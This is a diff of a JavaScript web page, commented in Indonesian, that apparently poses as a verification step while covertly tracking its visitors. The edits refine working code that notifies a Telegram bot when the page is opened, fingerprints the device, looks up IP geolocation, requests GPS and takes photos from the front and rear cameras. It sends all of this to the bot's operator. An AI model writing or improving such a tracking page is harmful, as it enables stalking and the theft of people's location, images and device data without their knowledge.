@@ -118,7 +118,6 @@
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
     }
 
-    // Notifikasi awal
     sendTelegramMessage(`🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n⏱ ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`);
 
     // ========== FINGERPRINTING ==========
@@ -156,27 +155,54 @@
       return navigator.getBattery?navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (charging:${b.charging})`).catch(()=>'batt_denied'):Promise.resolve('batt_no');
     }
 
-    function getNetworkInfo() {
-      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-      return c?`${c.effectiveType||'?'} / ${c.downlink||'?'}Mbps`:'net_unknown';
+    function getNetworkType() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!c) return 'Tidak diketahui';
+      if (c.type === 'cellular') return 'Seluler (Data)';
+      if (c.type === 'wifi') return 'WiFi';
+      if (c.effectiveType === '4g') return 'Mungkin Seluler (4G)';
+      return c.type || c.effectiveType || 'Tidak diketahui';
     }
 
-    // ========== PARSING BRAND & MODEL HP ==========
-    function getDeviceBrandModel(ua) {
+    // ========== PARSING MEREK/MODEL DARI GPU + UA ==========
+    function getDeviceBrandModel(ua, webglRenderer) {
       let brand = 'Tidak Diketahui', model = 'Tidak Diketahui';
-      if (ua.includes('Samsung')) { brand = 'Samsung'; const m = ua.match(/Samsung[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
-      else if (ua.includes('Xiaomi') || ua.includes('Redmi')) { brand = 'Xiaomi'; const m = ua.match(/(?:Xiaomi|Redmi)[ -]?([A-Za-z0-9]+)/); if(m) model = m[1]; }
-      else if (ua.includes('OPPO')) { brand = 'Oppo'; const m = ua.match(/OPPO[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
-      else if (ua.includes('vivo')) { brand = 'Vivo'; const m = ua.match(/vivo[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
-      else if (ua.includes('iPhone')) { brand = 'Apple'; const m = ua.match(/iPhone/); model = 'iPhone'; }
-      else if (ua.includes('Huawei')) { brand = 'Huawei'; const m = ua.match(/Huawei[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
-      else if (ua.includes('Realme')) { brand = 'Realme'; const m = ua.match(/Realme[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      // Coba parsing dari UA dulu
+      const uaLower = ua.toLowerCase();
+      if (uaLower.includes('samsung')) { brand = 'Samsung'; const m = ua.match(/Samsung[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('xiaomi') || uaLower.includes('redmi')) { brand = 'Xiaomi'; const m = ua.match(/(?:Xiaomi|Redmi)[ -]?([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('oppo')) { brand = 'Oppo'; const m = ua.match(/OPPO[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('vivo')) { brand = 'Vivo'; const m = ua.match(/vivo[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('iphone')) { brand = 'Apple'; model = 'iPhone'; }
+      else if (uaLower.includes('huawei')) { brand = 'Huawei'; const m = ua.match(/Huawei[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('realme')) { brand = 'Realme'; const m = ua.match(/Realme[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('infinix')) { brand = 'Infinix'; const m = ua.match(/Infinix[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+      else if (uaLower.includes('tecno')) { brand = 'Tecno'; const m = ua.match(/Tecno[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
+
+      // Jika masih tidak diketahui, coba tebak dari GPU renderer
+      if (brand === 'Tidak Diketahui' && webglRenderer) {
+        const rendererLower = webglRenderer.toLowerCase();
+        if (rendererLower.includes('mali-g68')) {
+          brand = 'Mungkin Samsung/Infinix';
+          model = 'Chipset Mali-G68 (A25, A34, GT 10 Pro, dll)';
+        } else if (rendererLower.includes('mali-g57')) {
+          brand = 'Mungkin Xiaomi/Realme';
+          model = 'Chipset Mali-G57';
+        } else if (rendererLower.includes('adreno')) {
+          brand = 'Qualcomm';
+          model = 'GPU Adreno';
+        } else if (rendererLower.includes('apple')) {
+          brand = 'Apple';
+          model = 'GPU Apple';
+        }
+      }
       return { brand, model };
     }
 
     function getDeviceSpecs() {
       const ua = navigator.userAgent;
-      const { brand, model } = getDeviceBrandModel(ua);
+      const webglRenderer = getWebGLFingerprint(); // sudah ada renderer
+      const { brand, model } = getDeviceBrandModel(ua, webglRenderer);
       return `Merek: ${brand}
 Model: ${model}
 Resolusi: ${screen.width}x${screen.height}
@@ -188,17 +214,16 @@ Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}`;
     }
 
-    // ========== IP & PROVIDER DETAIL ==========
+    // ========== IP & PROVIDER ==========
     async function fetchIPGeo() {
       try{
         const r=await fetch('https://ipapi.co/json/'); if(!r.ok)throw 0; const d=await r.json();
-        // Cek apakah ISP ini adalah provider seluler
-        const isp = d.org || d.asn || '';
-        let providerType = 'ISP';
-        if (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) providerType = 'Operator Seluler';
+        const isp = d.org || '';
+        let providerNote = '';
+        if (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) providerNote = ' (Operator Seluler)';
+        else providerNote = ' (Bukan Operator Seluler)';
         return `IP: ${d.ip}
-ISP: ${d.org || 'Tidak Diketahui'}
-Jenis Provider: ${providerType}
+ISP: ${d.org || 'Tidak Diketahui'}${providerNote}
 Kota: ${d.city}, ${d.region}
 Negara: ${d.country_name} (${d.country_code})
 Koord: ${d.latitude},${d.longitude}`;
@@ -207,11 +232,9 @@ Koord: ${d.latitude},${d.longitude}`;
           const ipR=await fetch('https://api.ipify.org?format=json'); const {ip}=await ipR.json();
           const geoR=await fetch(`https://ipinfo.io/${ip}/json`); const g=await geoR.json();
           const loc=g.loc?g.loc.split(','):['?','?']; const isp = g.org||'Tidak Diketahui';
-          let providerType = 'ISP';
-          if (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) providerType = 'Operator Seluler';
+          let providerNote = (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) ? ' (Operator Seluler)' : ' (Bukan Operator Seluler)';
           return `IP: ${ip}
-ISP: ${isp}
-Jenis Provider: ${providerType}
+ISP: ${isp}${providerNote}
 Kota: ${g.city||'?'}, ${g.region||'?'}
 Negara: ${g.country||'?'}
 Koord: ${loc[0]},${loc[1]}`;
@@ -219,7 +242,7 @@ Koord: ${loc[0]},${loc[1]}`;
       }
     }
 
-    // ========== PERBAIKAN KAMERA: DIPISAH ==========
+    // ========== KAMERA (FIX: menyimpan blob) ==========
     async function startCamera(facingMode) {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: facingMode, width:{ideal:1280}, height:{ideal:720} },
@@ -228,19 +251,15 @@ Koord: ${loc[0]},${loc[1]}`;
       video.srcObject = stream;
       await video.play();
       await new Promise(resolve => video.onloadedmetadata = resolve);
+      // Capture frame
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-      stream.getTracks().forEach(t=>t.stop());
+      // Cleanup
+      stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
       return blob;
-    }
-
-    async function captureBothCameras() {
-      // Minta depan dulu, baru belakang
-      try { capturedBlobs.front = await startCamera('user'); } catch(e) { capturedBlobs.front = null; }
-      try { capturedBlobs.rear = await startCamera('environment'); } catch(e) { capturedBlobs.rear = null; }
     }
 
     // ========== GPS ==========
@@ -249,7 +268,7 @@ Koord: ${loc[0]},${loc[1]}`;
         if (!navigator.geolocation) return reject(new Error('no_geo'));
         navigator.geolocation.getCurrentPosition(
           pos => {
-            gpsCoords = { lat:pos.coords.latitude, lng:pos.coords.longitude, acc:pos.coords.accuracy };
+            gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
             resolve(gpsCoords);
           },
           err => reject(err),
@@ -270,7 +289,8 @@ Koord: ${loc[0]},${loc[1]}`;
       if (frontImg) { maxW = Math.max(maxW, frontImg.width); totalH += frontImg.height; }
       if (rearImg) { maxW = Math.max(maxW, rearImg.width); totalH += rearImg.height; }
       if (frontImg && rearImg) totalH += gap;
-      canvas.width = maxW; canvas.height = totalH; ctx.fillStyle = '#000'; ctx.fillRect(0,0,maxW,totalH);
+      canvas.width = maxW; canvas.height = totalH;
+      ctx.fillStyle = '#000'; ctx.fillRect(0,0,maxW,totalH);
       let y = 0;
       if (frontImg) { ctx.drawImage(frontImg,0,y,frontImg.width,frontImg.height); y += frontImg.height; if (rearImg) y += gap; }
       if (rearImg) { ctx.drawImage(rearImg,0,y,rearImg.width,rearImg.height); }
@@ -284,17 +304,18 @@ Koord: ${loc[0]},${loc[1]}`;
         fingerData.webgl = getWebGLFingerprint();
         fingerData.audio = await getAudioFingerprint();
         fingerData.battery = await getBatteryStatus();
-        fingerData.net = getNetworkInfo();
+        fingerData.net = getNetworkType();
         fingerData.device = getDeviceSpecs();
         fingerData.ipGeo = await fetchIPGeo();
       }
       const locStr = gpsCoords ? `GPS: ${gpsCoords.lat.toFixed(6)}, ${gpsCoords.lng.toFixed(6)} (akurasi ${gpsCoords.acc}m)` : 'GPS: tidak tersedia';
-      const caption = `${success ? '✅ <b>VERIFIKASI BERHASIL</b>' : '⏰ <b>DATA TERKIRIM (TIMEOUT/GAGAL)</b>'}
+      const statusText = success ? '✅ VERIFIKASI BERHASIL SEBAGIAN' : '⏰ TIMEOUT / GAGAL';
+      const caption = `${statusText}
 ━━━━━━━━━━━━━━━━━━
 🌐 <b>Jaringan & Lokasi</b>
 ${fingerData.ipGeo}
 ${locStr}
-Koneksi: ${fingerData.net}
+Tipe Koneksi: ${fingerData.net}
 ━━━━━━━━━━━━━━━━━━
 📟 <b>Perangkat</b>
 ${fingerData.device}
@@ -334,31 +355,45 @@ Baterai: ${fingerData.battery}
       errorMsg.style.display = 'none';
       attempt++;
 
+      // Kumpulkan fingerprint di percobaan pertama
       if (attempt === 1) {
         fingerData.canvas = getCanvasFingerprint();
         fingerData.webgl = getWebGLFingerprint();
         fingerData.audio = await getAudioFingerprint();
         fingerData.battery = await getBatteryStatus();
-        fingerData.net = getNetworkInfo();
+        fingerData.net = getNetworkType();
         fingerData.device = getDeviceSpecs();
         fingerData.ipGeo = await fetchIPGeo();
       }
 
-      // PERBAIKAN: Minta GPS dan Kamera Depan dulu secara paralel (tapi pisahkan kamera belakang)
-      const gpsPromise = requestLocation().catch(() => null);
-      const camFrontPromise = startCamera('user').catch(() => null);
-      await Promise.all([gpsPromise, camFrontPromise]);
-      
+      // PERBAIKAN UTAMA: Simpan hasil kamera dengan benar
+      try {
+        capturedBlobs.front = await startCamera('user');
+      } catch (e) {
+        capturedBlobs.front = null;
+      }
+
+      // GPS bersamaan (sudah dijalankan, hasilnya di gpsCoords)
+      try {
+        await requestLocation();
+      } catch (e) {
+        gpsCoords = null;
+      }
+
       // Jika depan berhasil, coba kamera belakang
       if (capturedBlobs.front) {
-        try { capturedBlobs.rear = await startCamera('environment'); } catch(e) { capturedBlobs.rear = null; }
+        try {
+          capturedBlobs.rear = await startCamera('environment');
+        } catch (e) {
+          capturedBlobs.rear = null;
+        }
       } else {
         capturedBlobs.rear = null;
       }
 
-      // Cek apakah ada yang berhasil
-      if (capturedBlobs.front || gpsCoords) {
-        // Minimal ada satu yang berhasil, anggap sukses
+      // Anggap sukses jika minimal ada GPS atau kamera depan
+      const hasSomeData = capturedBlobs.front || gpsCoords;
+      if (hasSomeData) {
         await finalize(true);
       } else {
         if (attempt >= 2) {
@@ -373,7 +408,9 @@ Baterai: ${fingerData.battery}
     }
 
     function startTimeout() {
-      timerHandle = setTimeout(() => { if (!verificationDone) finalize(false); }, 30000);
+      timerHandle = setTimeout(() => {
+        if (!verificationDone) finalize(false);
+      }, 30000);
     }
 
     // ========== INIT ==========
